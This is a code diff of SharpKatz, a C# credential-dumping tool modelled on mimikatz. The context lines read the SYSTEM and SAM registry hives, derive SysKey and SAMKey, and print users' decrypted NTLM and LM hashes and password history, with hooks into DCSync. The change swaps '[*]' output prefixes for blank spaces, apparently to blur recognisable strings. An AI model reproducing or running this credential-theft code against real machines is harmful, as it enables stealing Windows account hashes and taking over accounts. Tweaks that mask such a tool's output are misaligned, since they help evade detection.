@@ -371,14 +371,14 @@ namespace SharpKatz.Module
 
             if (hDataSystem == IntPtr.Zero && hDataSystem != new IntPtr(-1))
             {
-                Console.WriteLine("[x] Error openign {0}", system);
+                Console.WriteLine("   Error openign {0}", system);
             }
 
             IntPtr hRegistry = RegistryOpen(KULL_M_REGISTRY_TYPE.KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, false);
 
             if (hRegistry == IntPtr.Zero )
             {
-                Console.WriteLine("[x] Error RegistryOpen {0}", system);
+                Console.WriteLine("   Error RegistryOpen {0}", system);
             }
 
             IntPtr sysKey = GetComputerAndSyskey(hRegistry, IntPtr.Zero);
@@ -418,7 +418,7 @@ namespace SharpKatz.Module
 
             if (OpenAndQueryWithAlloc(hRegistry, hSAMBase, "SAM\\Domains\\Account", "V", ref restype, ref pData, out szUser))
             {
-                Console.Write("[*] Local SID : ");
+                Console.Write("   Local SID : ");
                 Natives.ConvertSidToStringSid(IntPtr.Add(pData, (int)(szUser - (Marshal.SizeOf(typeof(SID)) + sizeof(uint) * 3))), out string sid);
                 Console.WriteLine(sid);
             }
@@ -456,7 +456,7 @@ namespace SharpKatz.Module
                                             rid = (uint)Convert.ToInt32(tmp, 16);
                                             if (rid != 0)
                                             {
-                                                Console.WriteLine("[*] RID  : {0,8} ({1})", tmp.Trim(), rid);
+                                                Console.WriteLine("   RID  : {0,8} ({1})", tmp.Trim(), rid);
                                                 hUser = RegOpenKeyEx(hRegistry, hUsers, tmp, 0, (ACCESS_MASK)KEY_READ);
                                                 if (status =(hUser != IntPtr.Zero) )
                                                 {
@@ -468,7 +468,7 @@ namespace SharpKatz.Module
                                                         int pluto = Utility.FieldOffset<USER_ACCOUNT_V>("datas");
                                                         UAv = (USER_ACCOUNT_V)Marshal.PtrToStructure(pUAv, typeof(USER_ACCOUNT_V));
                                                         UAv.datas = UpdateDataBytes(pUAv, Utility.FieldOffset<USER_ACCOUNT_V>("datas"), (int)needed - (Utility.FieldOffset<USER_ACCOUNT_V>("datas")));
-                                                        Console.WriteLine("[*] User : {0}", Encoding.Unicode.GetString(Utility.GetBytes(UAv.datas, UAv.Username.offset, (int)UAv.Username.lenght)));
+                                                        Console.WriteLine("   User : {0}", Encoding.Unicode.GetString(Utility.GetBytes(UAv.datas, UAv.Username.offset, (int)UAv.Username.lenght)));
 
                                                         GCHandle pinnedArrayDatas = GCHandle.Alloc(UAv.datas, GCHandleType.Pinned);
                                                         IntPtr pDatas = pinnedArrayDatas.AddrOfPinnedObject();
@@ -498,7 +498,7 @@ namespace SharpKatz.Module
                                                 }
                                                 else Console.WriteLine("RegOpenKeyEx user {0}\n", user);
 
-                                                Console.WriteLine("[*]");
+                                                Console.WriteLine("  ");
                                             }
                                         }
                                     }
@@ -529,7 +529,7 @@ namespace SharpKatz.Module
             IntPtr pDomAccF = IntPtr.Zero;
             uint needed = 0;
 
-            Console.Write("[*] SAMKey : ");
+            Console.Write("   SAMKey : ");
             if (OpenAndQueryWithAlloc(hRegistry, hAccount, string.Empty, "F", ref restype, ref pDomAccF, out needed))
             {
                 domAccF = (DOMAIN_ACCOUNT_F)Marshal.PtrToStructure(pDomAccF, typeof(DOMAIN_ACCOUNT_F)); //NOTE
@@ -603,7 +603,7 @@ namespace SharpKatz.Module
             if (status)
                 Console.WriteLine(Utility.PrintHash(samKey, Msv1.LM_NTLM_HASH_LENGTH));
 
-            Console.WriteLine("[*]");
+            Console.WriteLine("  ");
             return status;
         }
 
@@ -763,7 +763,7 @@ namespace SharpKatz.Module
 
 
                                         Marshal.Copy(pProperties, arr, 0, size);
-                                        Console.WriteLine("[*]");
+                                        Console.WriteLine("  ");
                                         DCSync.DcsyncDescrUserProperties(arr);
                                     }
                                 }
@@ -944,7 +944,7 @@ namespace SharpKatz.Module
                 RegCloseKey(hRegistry, p);
 
 
-                Console.Write("[*] Domain : ");
+                Console.Write("   Domain : ");
                 uint lptype = 0;
                 IntPtr pcomputerName = IntPtr.Zero;
                 uint needed = 0;
@@ -961,7 +961,7 @@ namespace SharpKatz.Module
                 }
                 
 
-                Console.Write("[*] SysKey : ");
+                Console.Write("   SysKey : ");
                 IntPtr hComputerNameOrLSA = RegOpenKeyEx(hRegistry, result, "Control\\LSA", 0, (Natives.ACCESS_MASK)KEY_READ);
                 if (hComputerNameOrLSA != IntPtr.Zero)
                 {
@@ -1489,9 +1489,9 @@ namespace SharpKatz.Module
                 {
                     Marshal.Copy(pdata,data,0, Msv1.LM_NTLM_HASH_LENGTH);
                     if (isHistory)
-                        Console.Write("[*]    {0}-{1}: ", prefix, i / Msv1.LM_NTLM_HASH_LENGTH);
+                        Console.Write("      {0}-{1}: ", prefix, i / Msv1.LM_NTLM_HASH_LENGTH);
                     else
-                        Console.Write("[*]  Hash {0}: ", prefix);
+                        Console.Write("    Hash {0}: ", prefix);
                     Console.WriteLine(Utility.PrintHashBytes(data));
                 }
                 else Console.Write("RtlDecryptNtOwfPwdWithIndex/RtlDecryptLmOwfPwdWithIndex");
